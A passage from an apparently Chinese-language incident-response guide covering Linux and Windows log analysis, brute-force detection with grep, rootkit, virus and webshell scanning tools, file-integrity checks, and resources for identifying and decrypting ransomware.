+/var/log/btmp &#35760;&#24405;&#38169;&#35823;&#30331;&#24405;&#26085;&#24535;&#65292;&#36825;&#20010;&#25991;&#20214;&#26159;&#20108;&#36827;&#21046;&#25991;&#20214;&#65292;&#19981;&#33021;&#30452;&#25509;vi&#26597;&#30475;&#65292;&#32780;&#35201;&#20351;&#29992;lastb&#21629;&#20196;&#26597;&#30475;
+
+/var/log/lastlog &#35760;&#24405;&#31995;&#32479;&#20013;&#25152;&#26377;&#29992;&#25143;&#26368;&#21518;&#19968;&#27425;&#30331;&#24405;&#26102;&#38388;&#30340;&#26085;&#24535;&#65292;&#36825;&#20010;&#25991;&#20214;&#26159;&#20108;&#36827;&#21046;&#25991;&#20214;&#65292;&#19981;&#33021;&#30452;&#25509;vi&#65292;&#32780;&#35201;&#20351;&#29992;lastlog&#21629;&#20196;&#26597;&#30475;
+
+/var/log/wtmp &#27704;&#20037;&#35760;&#24405;&#25152;&#26377;&#29992;&#25143;&#30340;&#30331;&#24405;&#12289;&#27880;&#38144;&#20449;&#24687;&#65292;&#21516;&#26102;&#35760;&#24405;&#31995;&#32479;&#30340;&#21551;&#21160;&#12289;&#37325;&#21551;&#12289;&#20851;&#26426;&#20107;&#20214;&#12290;&#21516;&#26679;&#36825;&#20010;&#25991;&#20214;&#20063;&#26159;&#19968;&#20010;&#20108;&#36827;&#21046;&#25991;&#20214;&#65292;&#19981;&#33021;&#30452;&#25509;vi&#65292;&#32780;&#38656;&#35201;&#20351;&#29992;last&#21629;&#20196;&#26469;&#26597;&#30475;
+
+/var/log/utmp &#35760;&#24405;&#24403;&#21069;&#24050;&#32463;&#30331;&#24405;&#30340;&#29992;&#25143;&#20449;&#24687;&#65292;&#36825;&#20010;&#25991;&#20214;&#20250;&#38543;&#30528;&#29992;&#25143;&#30340;&#30331;&#24405;&#21644;&#27880;&#38144;&#19981;&#26029;&#21464;&#21270;&#65292;&#21482;&#35760;&#24405;&#24403;&#21069;&#30331;&#24405;&#29992;&#25143;&#30340;&#20449;&#24687;&#12290;&#21516;&#26679;&#36825;&#20010;&#25991;&#20214;&#19981;&#33021;&#30452;&#25509;vi&#65292;&#32780;&#35201;&#20351;&#29992;w&#65292;who&#65292;users&#31561;&#21629;&#20196;&#26469;&#26597;&#35810;
+
+/var/log/secure &#35760;&#24405;&#39564;&#35777;&#21644;&#25480;&#26435;&#26041;&#38754;&#30340;&#20449;&#24687;&#65292;&#21482;&#35201;&#28041;&#21450;&#36134;&#21495;&#21644;&#23494;&#30721;&#30340;&#31243;&#24207;&#37117;&#20250;&#35760;&#24405;&#65292;&#27604;&#22914;SSH&#30331;&#24405;&#65292;su&#20999;&#25442;&#29992;&#25143;&#65292;sudo&#25480;&#26435;&#65292;&#29978;&#33267;&#28155;&#21152;&#29992;&#25143;&#21644;&#20462;&#25913;&#29992;&#25143;&#23494;&#30721;&#37117;&#20250;&#35760;&#24405;&#22312;&#36825;&#20010;&#26085;&#24535;&#25991;&#20214;&#20013;
+  Ubuntu/Debian &#20026; /var/log/auth.log
+</pre>
+</div>
+<p>
+安全人员比较关注的文件： /var/log/lastlog, /var/log/secure
+</p>
+
+<p>
+日志分析技巧：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh">1&#12289;&#23450;&#20301;&#26377;&#22810;&#23569;IP&#22312;&#29190;&#30772;&#20027;&#26426;&#30340;root&#36134;&#21495;&#65306;
+grep <span class="org-string">"Failed password for root"</span> /var/log/secure | awk <span class="org-string">'{print $11}'</span> | sort | uniq -c | sort -nr | more
+
+2&#12289;&#23450;&#20301;&#26377;&#21738;&#20123;IP&#22312;&#29190;&#30772;&#65306;
+grep <span class="org-string">"Failed password"</span> /var/log/secure | grep -E -o <span class="org-string">"(25[0-5]|2[0-4][0-9]|[01]? [0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]? [0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"</span>|uniq -c
+
+3&#12289;&#29190;&#30772;&#29992;&#25143;&#21517;&#23383;&#20856;&#26159;&#20160;&#20040;&#65311;
+grep <span class="org-string">"Failed password"</span> /var/log/secure|perl -e <span class="org-string">'while($_=&lt;&gt;){ /for(.*?) from/; print "$1\n";}'</span> | uniq -c | sort -nr
+
+4&#12289;&#30331;&#24405;&#25104;&#21151;&#30340;IP&#26377;&#21738;&#20123;&#65306;
+grep <span class="org-string">"Accepted "</span> /var/log/secure | awk <span class="org-string">'{print $11}'</span> | sort | uniq -c | sort -nr | more
+
+5&#12289;&#30331;&#24405;&#25104;&#21151;&#30340;&#26085;&#26399;&#12289;&#29992;&#25143;&#21517;&#12289;IP&#65306;
+grep <span class="org-string">"Accepted "</span> /var/log/secure | awk <span class="org-string">'{print $1,$2,$3,$9,$11}'</span>
+</pre>
+</div>
+
+<p>
+手工排查：
+</p>
+<ul class="org-ul">
+<li>检查程序的签名、描述信息</li>
+<li>查看程序的引用文件或者 DLL</li>
+<li>网络连接</li>
+<li>逆向分析</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-h:6401c5d1-dfce-44a3-bce9-018909aaa639" class="outline-4">
+<h4 id="h:6401c5d1-dfce-44a3-bce9-018909aaa639"><a href="#h:6401c5d1-dfce-44a3-bce9-018909aaa639">工具查杀</a></h4>
+<div class="outline-text-4" id="text-h:6401c5d1-dfce-44a3-bce9-018909aaa639">
+</div>
+<div id="outline-container-h:20ab8570-f66a-40ff-aeed-2fe75bab1537" class="outline-5">
+<h5 id="h:20ab8570-f66a-40ff-aeed-2fe75bab1537"><a href="#h:20ab8570-f66a-40ff-aeed-2fe75bab1537">Rootkit查杀</a></h5>
+<div class="outline-text-5" id="text-h:20ab8570-f66a-40ff-aeed-2fe75bab1537">
+<p>
+rootkit是特殊的恶意软件，它的功能是在目标机器上安装隐藏自身以及指定的文件、进程和网络连接等信息，来帮助攻击者做一些隐藏。比较常见的场景是木马后门等其它的恶意程序放在一起使用。在实际工作中比较难遇到，它是一种隐藏恶意程序、隐藏进程、隐藏网络的攻击方式。
+</p>
+
+<ul class="org-ul">
+<li>chkrootkit</li>
+</ul>
+<p>
+网址：<a href="http://www.chkrootkit.org">http://www.chkrootkit.org</a>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">&#20351;&#29992;&#26041;&#27861;&#65306;
+wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz
+tar zxvf chkrootkit.tar.gz
+<span class="org-builtin">cd</span> chkrootkit-0.52
+make sense
+<span class="org-comment-delimiter">#</span><span class="org-comment">&#32534;&#35793;&#23436;&#25104;&#27809;&#26377;&#25253;&#38169;&#30340;&#35805;&#25191;&#34892;&#26816;&#26597;
+</span>./chkrootkit
+</pre>
+</div>
+
+<ul class="org-ul">
+<li>rkhunter</li>
+</ul>
+<p>
+网址：<a href="http://rkhunter.sourceforge.net">http://rkhunter.sourceforge.net</a>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">&#20351;&#29992;&#26041;&#27861;&#65306;
+wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter- 1.4.4.tar.gz
+tar -zxvf rkhunter-1.4.4.tar.gz
+<span class="org-builtin">cd</span> rkhunter-1.4.4
+./installer.sh --install
+rkhunter -c 
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:b6b461cb-37b4-41ea-bd54-b56fbcbd7d54" class="outline-5">
+<h5 id="h:b6b461cb-37b4-41ea-bd54-b56fbcbd7d54"><a href="#h:b6b461cb-37b4-41ea-bd54-b56fbcbd7d54">病毒查杀</a></h5>
+<div class="outline-text-5" id="text-h:b6b461cb-37b4-41ea-bd54-b56fbcbd7d54">
+<ul class="org-ul">
+<li>Clamav</li>
+</ul>
+<p>
+网址：<a href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a>
+</p>
+
+<p>
+安装方式：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-comment-delimiter">#</span><span class="org-comment">&#23433;&#35013;
+</span>yum install -y epel-release
+
+<span class="org-comment-delimiter">#</span><span class="org-comment">&#20351;&#29992;&#38463;&#37324;&#20113;epel&#28304;
+</span>wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo
+yum clean all
+yum makecache
+yum install -y clamav
+
+<span class="org-comment-delimiter">#</span><span class="org-comment">&#26356;&#26032;&#30149;&#27602;&#24211;
+</span>freshclam
+
+<span class="org-comment-delimiter">#</span><span class="org-comment">&#25195;&#25551;&#26041;&#27861;
+</span>clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log
+clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log
+clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log
+
+<span class="org-comment-delimiter">#</span><span class="org-comment">&#25195;&#25551;&#24182;&#26432;&#27602;&#65292;&#19981;&#25512;&#33616;&#30452;&#25509;&#26432;&#27602;
+</span>clamscan -r --remove /usr/bin/bsd-port
+clamscan -r --remove /usr/bin/
+clamscan -r --remove /usr/local/zabbix/sbin
+
+<span class="org-comment-delimiter">#</span><span class="org-comment">&#26597;&#30475;&#26085;&#24535;&#21457;&#29616;
+</span>cat /root/etcclamav.log | grep FOUND
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-h:76205d2d-9ada-4aa7-a8de-8ce3e5e8b5a1" class="outline-5">
+<h5 id="h:76205d2d-9ada-4aa7-a8de-8ce3e5e8b5a1"><a href="#h:76205d2d-9ada-4aa7-a8de-8ce3e5e8b5a1">Webshell查杀</a></h5>
+<div class="outline-text-5" id="text-h:76205d2d-9ada-4aa7-a8de-8ce3e5e8b5a1">
+<p>
+河马 WebShell 查杀：<a href="http://www.shellpub.com">http://www.shellpub.com</a> 官方文档详细
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-h:515b7fac-1aea-487e-99fb-39fa5ec07c29" class="outline-4">
+<h4 id="h:515b7fac-1aea-487e-99fb-39fa5ec07c29"><a href="#h:515b7fac-1aea-487e-99fb-39fa5ec07c29">常见的WebShell查杀工具</a></h4>
+<div class="outline-text-4" id="text-h:515b7fac-1aea-487e-99fb-39fa5ec07c29">
+<p>
+当网站服务器被入侵时，我们需要一款Webshell检测工具，来帮助我们发现Webshell，进一步排查系统可能存在的安全漏洞。
+</p>
+
+<p>
+网站中正常的系统命令一般写在代码中，不会在流量中体现，由此来发现不安全操作。
+</p>
+
+<p>
+D盾_Web查杀
+</p>
+<ul class="org-ul">
+<li>阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的 WebShell 后门行为。</li>
+<li>兼容性：只提供 Windows 版本。</li>
+<li>工具下载地址：<a href="http://www.d99net.net">http://www.d99net.net</a></li>
+</ul>
+
+<p>
+百度 WEBDIR+
+</p>
+<ul class="org-ul">
+<li>下一代 WebShell 检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。</li>
+<li>兼容性：提供在线查杀木马，免费开放 API 支持批量检测。</li>
+<li>在线查杀地址：<a href="https://scanner.baidu.com/#/pages/intro">https://scanner.baidu.com/#/pages/intro</a></li>
+</ul>
+
+<p>
+河马
+</p>
+<ul class="org-ul">
+<li>专注 WebShell 查杀研究，拥有海量 WebShell 样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。</li>
+<li>兼容性：支持 Windows、Linux，支持在线查杀。</li>
+<li>官方网站：<a href="https://www.shellpub.com">https://www.shellpub.com</a></li>
+</ul>
+
+<p>
+Web Shell Detector
+</p>
+<ul class="org-ul">
+<li>Web Shell Detector 具有 WebShell 签名数据库，可帮助识别高达 99％ 的 WebShell。</li>
+<li>兼容性：提供 PHP、Python 脚本，可跨平台，在线检测。</li>
+<li>官方网站：<a href="http://www.shelldetector.com">http://www.shelldetector.com</a></li>
+</ul>
+
+<p>
+CloudWalker（牧云）
+</p>
+<ul class="org-ul">
+<li>一个可执行命令行版本的 Webshell 检测工具。</li>
+<li>兼容性：暂时只支持 PHP Webshell 的检测。</li>
+<li>在线查杀 demo：<a href="https://webshellchop.chaitin.cn/demo/">https://webshellchop.chaitin.cn/demo/</a></li>
+<li>GitHub 项目地址：<a href="https://github.com/chaitin/cloudwalker">https://github.com/chaitin/cloudwalker</a></li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-h:bef7aac0-add2-483b-95dd-458ed18abf1f" class="outline-3">
+<h3 id="h:bef7aac0-add2-483b-95dd-458ed18abf1f"><a href="#h:bef7aac0-add2-483b-95dd-458ed18abf1f">如何发现隐藏的WebShell后门</a></h3>
+<div class="outline-text-3" id="text-h:bef7aac0-add2-483b-95dd-458ed18abf1f">
+<p>
+如何在百万行代码里发现隐藏的后门？
+</p>
+
+<p>
+试想一下，如果你的网站被入侵，攻击者留下隐藏的后门，你真的都可以找出来吗？面对一个大中型的应用系统，数以百万级的代码行，是不可能做到每个文件每段代码进行手工检查的。即使是一款拥有99.9% 的 Webshell 检出率的检测引擎，依然可能存在 Webshell 绕过的情况。另外，像暗链、网页劫持、页面跳转等常见的黑帽 SEO 手法，也很难通过手动检测或工具检测全部识别出来。
+</p>
+
+<p>
+最好的方式就是做文件完整性验证。通过与原始代码对比，可以快速发现文件是否被篡改以及被篡改的位置。当然，前提是要具备代码版本管理的能力。
+</p>
+
+<p>
+下列几种文件完整性验证方式，可以找出代码中所有隐藏的后门。
+</p>
+</div>
+<div id="outline-container-h:e6afe316-bfc8-4104-bd44-620dce8dc173" class="outline-4">
+<h4 id="h:e6afe316-bfc8-4104-bd44-620dce8dc173"><a href="#h:e6afe316-bfc8-4104-bd44-620dce8dc173">MD5校验</a></h4>
+<div class="outline-text-4" id="text-h:e6afe316-bfc8-4104-bd44-620dce8dc173">
+<p>
+下载D盾_Web查杀工具的时候，我们可以留意到下载的压缩包里有一个 exe 可执行文件，拥有自身的md5 值。这个是软件作者在发布软件时，通过 md5 算法计算出该 exe 文件的"特征值"。
+</p>
+
+<p>
+下载地址：<a href="https://www.d99net.net/down/d_safe_2.1.7.2.zip">https://www.d99net.net/down/d_safe_2.1.7.2.zip</a>
+文件 MD5：e2ec949fd70c4c921ee38979dda39d11 D_Safe_Manage.exe
+</p>
+<div class="org-src-container">
+<pre class="src src-nil">C:\Users\jasper\d_safe_2.1.7.2&gt;certutil -hashfile D_Safe_Manage.exe MD5
+MD5 hash of D_Safe_Manage.exe:
+e2ec949fd70c4c921ee38979dda39d11
+CertUtil: -hashfile command completed successfully.
+</pre>
+</div>
+
+<p>
+当用户下载软件时，可以使用相同的校验算法计算下载到 exe 文件的特征值，并与软件开发者发布的特征值比较。如果两个特征值相同，则认为下载到的 exe 文件是正确的。如果两个特征值不同，则认为下载到 exe 文件是被篡改过的。
+</p>
+
+<p>
+那同理可得，我们可以将所有网站文件计算一次 hash 值保存，当出现应急情况时，重新计算一次 hash值，并与上次保存的 hash 值进行对比，从而输出新创建的、修改过及删除的文件列表。
+</p>
+
+<p>
+文件 hash 值计算：
+</p>
+
+<div class="org-src-container">
+<pre class="src src-python"><span class="org-keyword">def</span> <span class="org-function-name">md5sum</span>(<span class="org-builtin">file</span>):
+    <span class="org-variable-name">m</span><span class="org-operator">=</span>hashlib.md5()
+    <span class="org-keyword">if</span> os.path.isfile(<span class="org-builtin">file</span>):
+        <span class="org-variable-name">f</span><span class="org-operator">=</span><span class="org-builtin">open</span>(<span class="org-builtin">file</span>,<span class="org-string">'rb'</span>)
+        <span class="org-keyword">for</span> line <span class="org-keyword">in</span> f:
+            m.update(line)
+        f.close
+    <span class="org-keyword">else</span>:
+        m.update(<span class="org-builtin">file</span>)
+    <span class="org-keyword">return</span> (m.hexdigest())
+</pre>
+</div>
+
+<p>
+对文件进行哈希值重新计算，进行校验对比。
+</p>
+</div>
+</div>
+<div id="outline-container-h:ed1bfc2e-bfc6-4c8d-ad98-04abf6b0790b" class="outline-4">
+<h4 id="h:ed1bfc2e-bfc6-4c8d-ad98-04abf6b0790b"><a href="#h:ed1bfc2e-bfc6-4c8d-ad98-04abf6b0790b">diff 命令</a></h4>
+<div class="outline-text-4" id="text-h:ed1bfc2e-bfc6-4c8d-ad98-04abf6b0790b">
+<p>
+在 Linux 中，可以使用 diff 命令来比较两个文本文件的差异。同样，我们可以通过一行命令快速找出两个项目文件的差异。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">-a diff&#39044;&#35774;&#21482;&#20250;&#36880;&#34892;&#27604;&#36739;&#25991;&#26412;&#25991;&#20214;
+-c &#19978;&#19979;&#25991;&#26684;&#24335;&#65288;context diff)
+-r &#27604;&#36739;&#23376;&#30446;&#24405;&#20013;&#30340;&#25991;&#20214;
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-sh">diff -c -a -r 2.php 3.php
+</pre>
+</div>
+
+
+<figure id="org7e40de7">
+<img style="aspect-ratio:1578/464" decoding="async" loading="lazy" src="./images/img_20230814_162712.webp" alt="img_20230814_162712.webp" width="50%">
+
+</figure>
+
+<p>
+如果只是想查看两个文件是否不同又不想显示差异之处的话，可以加上 -q 选项。
+</p>
+</div>
+</div>
+<div id="outline-container-h:fcb4464a-9c37-4ec8-b05f-16c74ec30fcc" class="outline-4">
+<h4 id="h:fcb4464a-9c37-4ec8-b05f-16c74ec30fcc"><a href="#h:fcb4464a-9c37-4ec8-b05f-16c74ec30fcc">文件对比工具</a></h4>
+<div class="outline-text-4" id="text-h:fcb4464a-9c37-4ec8-b05f-16c74ec30fcc">
+<p>
+关键词：代码对比工具，你会找到很多好用的工具，这里我们推荐两款效果还不错的工具，Beyond Compare 和 WinMerge。
+</p>
+
+<p>
+<b>Beyond Compare</b>
+</p>
+
+<p>
+Beyond Compare 是一套由 Scooter Software 推出的文件比较工具。主要用途是对比两个文件夹或者文件，并将差异以颜色标示，比较范围包括目录，文档内容等。
+</p>
+
+<p>
+下载地址：<a href="http://www.scootersoftware.com/download.php">http://www.scootersoftware.com/download.php</a>
+</p>
+
+<p>
+软件使用示例，通过文件夹比较，找出文件夹中的差异内容：双击 Beyond Compare ，打开软件主页，选择文件夹比较，分别加载两个文件夹，直接比较即可。
+</p>
+
+
+<figure id="org01d6c46">
+<img style="aspect-ratio:1572/842" decoding="async" loading="lazy" src="./images/img_20230814_162915.webp" alt="img_20230814_162915.webp" width="50%">
+
+</figure>
+
+<p>
+<b>WinMerge</b>
+</p>
+
+<p>
+WinMerge 是一款运行于 Windows 系统下的文件比较和合并工具，使用它可以非常方便地比较文件夹和文件，以易于理解的可视文本格式显示差异。
+</p>
+
+<p>
+下载地址：<a href="https://winmerge.org/downloads/">https://winmerge.org/downloads/</a>
+</p>
+
+
+<figure id="org424cac8">
+<img style="aspect-ratio:1586/736" decoding="async" loading="lazy" src="./images/img_20230814_162934.webp" alt="img_20230814_162934.webp" width="50%">
+
+</figure>
+
+<ol class="org-ol">
+<li>文件 &#x2013; 打开，选择文件或文件夹，然后点击进行比较。</li>
+<li>在同一个界面里，通过颜色和文本提示，显示文件夹内容差异。</li>
+</ol>
+</div>
+</div>
+</div>
+<div id="outline-container-h:f785651d-4c48-4940-8edc-035dd5e57059" class="outline-3">
+<h3 id="h:f785651d-4c48-4940-8edc-035dd5e57059"><a href="#h:f785651d-4c48-4940-8edc-035dd5e57059">勒索病毒自救指南</a></h3>
+<div class="outline-text-3" id="text-h:f785651d-4c48-4940-8edc-035dd5e57059">
+</div>
+<div id="outline-container-h:26cb4d10-921a-4d32-bd8d-eacb5892f671" class="outline-4">
+<h4 id="h:26cb4d10-921a-4d32-bd8d-eacb5892f671"><a href="#h:26cb4d10-921a-4d32-bd8d-eacb5892f671">勒索病毒加密原理</a></h4>
+<div class="outline-text-4" id="text-h:26cb4d10-921a-4d32-bd8d-eacb5892f671">
+
+<figure id="org5d46726">
+<img style="aspect-ratio:1124/716" decoding="async" loading="lazy" src="./images/img_20230814_163012.webp" alt="img_20230814_163012.webp" width="50%">
+
+</figure>
+
+<p>
+<b>原理</b>
+</p>
+
+<p>
+公开密钥密码体系要求密钥成对出现，一个用于加密，另一个用于解密，并且不可能从其中一个推导出另一个。
+</p>
+
+<p>
+<b>加密过程</b>
+</p>
+<ol class="org-ol">
+<li>病毒作者首先在自己电脑上生成的 私钥Q 和 公钥Q</li>
+<li>病毒在目标电脑上随机生成 私钥Z 和 公钥Z</li>
+<li>将用户电脑上的文件通过 公钥Z 加密</li>
+<li>将用户电脑上的 私钥Z 通过 公钥Q 加密</li>
+<li>删除用户电脑上的 私钥Z 、公钥Q、数据</li>
+</ol>
+
+<p>
+<b>解密过程</b>
+</p>
+
+<p>
+支付完赎金之后获得 私钥Q ，通过用户的 <code>加密私钥</code> 解出 <code>私钥Z</code> ，通过 <code>私钥Z</code> 解密 <code>用户数据</code> 。
+</p>
+</div>
+</div>
+<div id="outline-container-h:85408cb0-64ca-4c57-977a-3672675d5ffa" class="outline-4">
+<h4 id="h:85408cb0-64ca-4c57-977a-3672675d5ffa"><a href="#h:85408cb0-64ca-4c57-977a-3672675d5ffa">勒索病毒搜索引擎</a></h4>
+<div class="outline-text-4" id="text-h:85408cb0-64ca-4c57-977a-3672675d5ffa">
+<p>
+在勒索病毒搜索引擎输入病毒名、勒索邮箱、被加密后文件的后缀名，或直接上传被加密文件、勒索提示信息，即可快速查找到病毒详情和解密工具。
+</p>
+
+<p>
+【360】 勒索病毒搜索引擎，支持检索超过800种常见勒索病毒
+</p>
+<ul class="org-ul">
+<li>官网：<a href="http://lesuobingdu.360.cn">http://lesuobingdu.360.cn</a></li>
+</ul>
+
+<p>
+【腾讯】 勒索病毒搜索引擎，支持检索超过 1000+ 种常见勒索病毒
+</p>
+<ul class="org-ul">
+<li>官网：<a href="https://guanjia.qq.com/pr/ls">https://guanjia.qq.com/pr/ls</a></li>
+</ul>
+
+<p>
+【启明】VenusEye勒索病毒搜索引擎，超300种勒索病毒家族
+</p>
+<ul class="org-ul">
+<li>官网：<a href="https://lesuo.venuseye.com.cn">https://lesuo.venuseye.com.cn</a></li>
+</ul>
+
+<p>
+【奇安信】勒索病毒搜索引擎
+</p>
+<ul class="org-ul">
+<li>官网：<a href="https://lesuobingdu.qianxin.com">https://lesuobingdu.qianxin.com</a></li>
+</ul>
+
+<p>
+【深信服】勒索病毒搜索引擎
+</p>
+<ul class="org-ul">
+<li>官网：<a href="https://edr.sangfor.com.cn/#/information/ransom_search">https://edr.sangfor.com.cn/#/information/ransom_search</a></li>
+</ul>
+</div>
+</div>
+<div id="outline-container-h:646074d3-1eaf-4e6a-8fae-cbdd4e19cc4f" class="outline-4">
+<h4 id="h:646074d3-1eaf-4e6a-8fae-cbdd4e19cc4f"><a href="#h:646074d3-1eaf-4e6a-8fae-cbdd4e19cc4f">勒索软件解密工具集</a></h4>
+<div class="outline-text-4" id="text-h:646074d3-1eaf-4e6a-8fae-cbdd4e19cc4f">
+<p>
+很多安全公司都提供了免费的勒索病毒解密工具下载，收集和整理相关下载地址，可以帮助我们了解和获取最新的勒索病毒解密工具。
+</p>
+
+<p>
+【腾讯哈勃】勒索软件专杀工具
+</p>
+<ul class="org-ul">
+<li>官网：<a href="https://habo.qq.com/tool">https://habo.qq.com/tool</a></li>
+</ul>
+
+<p>
+【金山毒霸】勒索病毒免疫工具
+</p>
+<ul class="org-ul">
+<li>官网：<a href="http://www.duba.net/dbt/wannacry.html">http://www.duba.net/dbt/wannacry.html</a></li>
+</ul>
+
+<p>
+【火绒】安全工具下载
+</p>
+<ul class="org-ul">
+<li>官网：<a href="http://bbs.huorong.cn/forum-55-1.html">http://bbs.huorong.cn/forum-55-1.html</a></li>
+</ul>
+
+<p>
+【瑞星】解密工具下载
+</p>
+<ul class="org-ul">
+<li>官网：<a href="http://it.rising.com.cn/fanglesuo/index.html">http://it.rising.com.cn/fanglesuo/index.html</a></li>
+</ul>
+
+<p>
+【nomoreransom】勒索软件解密工具集
+</p>
+<ul class="org-ul">
+<li>官网：<a href="https://www.nomoreransom.org/zh/index.html">https://www.nomoreransom.org/zh/index.html</a></li>
+</ul>
+
+<p>
+【MalwareHunterTeam】勒索软件解密工具集
+</p>
+<ul class="org-ul">
+<li>官网：<a href="https://id-ransomware.malwarehunterteam.com">https://id-ransomware.malwarehunterteam.com</a></li>
+</ul>
+
+<p>
+【卡巴斯基】免费勒索解密器
+</p>
+<ul class="org-ul">
+<li>官网：<a href="https://noransom.kaspersky.com">https://noransom.kaspersky.com</a></li>
+</ul>
+
+<p>
+【Avast】免费勒索软件解密工具
+</p>
+<ul class="org-ul">
+<li>官网：<a href="https://www.avast.com/zh-cn/ransomware-decryption-tools">https://www.avast.com/zh-cn/ransomware-decryption-tools</a></li>
+</ul>
+
+<p>
+【Emsisoft】免费勒索软件解密工具
+</p>
+<ul class="org-ul">
+<li>官网：<a href="https://www.emsisoft.com/ransomware-decryption-tools/free-download">https://www.emsisoft.com/ransomware-decryption-tools/free-download</a></li>
+</ul>
+
+<p>
+【GitHub 项目】勒索病毒解密工具收集汇总
+</p>
+<ul class="org-ul">
+<li>官网：<a href="https://github.com/jiansiting/Decryption-Tools">https://github.com/jiansiting/Decryption-Tools</a></li>
+</ul>
+
+<p>
+针对勒索病毒最好的防御方法就是备份。
+</p>
+</div>
+</div>
+</div>
+</section>
+<section id="outline-container-h:c26653c9-8354-4a48-b1aa-5154167bcb3a" class="outline-2">
+<h2 id="h:c26653c9-8354-4a48-b1aa-5154167bcb3a"><a href="#h:c26653c9-8354-4a48-b1aa-5154167bcb3a">日志分析</a></h2>
+<div class="outline-text-2" id="text-h:c26653c9-8354-4a48-b1aa-5154167bcb3a">
+<p>
+主要内容：
+</p>
+<ul class="org-ul">
+<li>Windows 日志分析</li>
+<li>Linux 日志分析</li>
+<li>web 日志分析</li>
+<li>MySQL 日志分析</li>
+</ul>
+</div>
+<div id="outline-container-h:c630603c-65f4-4635-b0a6-ed004a034cd5" class="outline-3">
+<h3 id="h:c630603c-65f4-4635-b0a6-ed004a034cd5"><a href="#h:c630603c-65f4-4635-b0a6-ed004a034cd5">Windows日志分析</a></h3>
+<div class="outline-text-3" id="text-h:c630603c-65f4-4635-b0a6-ed004a034cd5">
+<p>
+<b>使用环境：Windows Server 2008 R2</b>
+</p>
+</div>
+<div id="outline-container-h:84bcb036-c79c-464d-986c-1971f5175d94" class="outline-4">
+<h4 id="h:84bcb036-c79c-464d-986c-1971f5175d94"><a href="#h:84bcb036-c79c-464d-986c-1971f5175d94">Windows事件日志简介</a></h4>
+<div class="outline-text-4" id="text-h:84bcb036-c79c-464d-986c-1971f5175d94">
+<p>
+Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。
+</p>
+
+<p>
+Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。
+</p>
+
+<p>
+开始菜单&#x2013;&gt;管理工具&#x2013;&gt;事件查看器
+</p>
+
+<p>
+<b>系统日志</b>
+</p>
+<ul class="org-ul">
+<li>记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日 志中记录的时间类型由Windows操作系统预先定义。</li>
+<li>默认位置： %SystemRoot%\System32\Winevt\Logs\System.evtx</li>
+</ul>
+
+<p>
+<b>应用程序日志</b>
+</p>
+<ul class="org-ul">
+<li>包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志 中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以 从程序事件日志中找到相应的记录。</li>
+<li>默认位置：%SystemRoot%\System32\Winevt\Logs\Application.evtx</li>
+</ul>
+
+<p>
+<b>安全日志</b>
+</p>
+<ul class="org-ul">
+<li>记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、账号管理、 策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全日志是关闭的，可以使用 组策略来启动安全日志，或者在注册表中设置审核策略，以便当安全日志满后使系统停止响应。</li>
+<li>默认位置：%SystemRoot%\System32\Winevt\Logs\Security.evtx</li>
+</ul>
+
+<p>
+系统日志和应用程序日志存储着故障排除信息，对于系统管理员更为有用。安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于应急人员而言，更有帮助。
+</p>
+</div>
+</div>
+<div id="outline-container-h:501e691b-deb4-4a5c-9908-e2353893bed7" class="outline-4">
+<h4 id="h:501e691b-deb4-4a5c-9908-e2353893bed7"><a href="#h:501e691b-deb4-4a5c-9908-e2353893bed7">审核策略与事件查看器</a></h4>
+<div class="outline-text-4" id="text-h:501e691b-deb4-4a5c-9908-e2353893bed7">
+<p>
+Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。
+</p>
+
+<p>
+PS：默认状态下，也会记录一些简单的日志，日志默认大小20M
+</p>
+
+<p>
+设置：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，本地安全设置。
+</p>
+
+<p>
+默认都未审核，双击可以针对不同事件做成功和失败审核。
+</p>
+
+
+<figure id="org2a12dc5">
+<img style="aspect-ratio:1576/820" decoding="async" loading="lazy" src="./images/img_20230814_163557.webp" alt="img_20230814_163557.webp" width="50%">
+
+</figure>
+
+
+<p>
+<b>查看系统日志方法：</b>
+</p>
+<ol class="org-ol">
+<li>在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器”</li>
+<li>按 "Window+R"，输入 ”eventvwr.msc“ 也可以直接进入“事件查看器”</li>
+</ol>
+</div>
+</div>
